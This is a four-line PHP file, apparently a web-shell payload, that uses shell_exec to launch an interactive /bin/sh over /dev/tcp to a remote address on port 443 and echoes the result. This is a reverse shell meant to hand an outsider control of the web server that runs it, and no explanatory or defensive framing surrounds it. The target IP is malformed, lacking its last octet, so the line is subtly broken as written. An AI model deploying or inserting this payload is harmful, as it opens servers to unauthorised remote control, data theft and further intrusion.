<?php
	$output=shell_exec("/bin/sh -i >& /dev/tcp/172.16.1./443 0>&1 &");
	echo $output;
?>
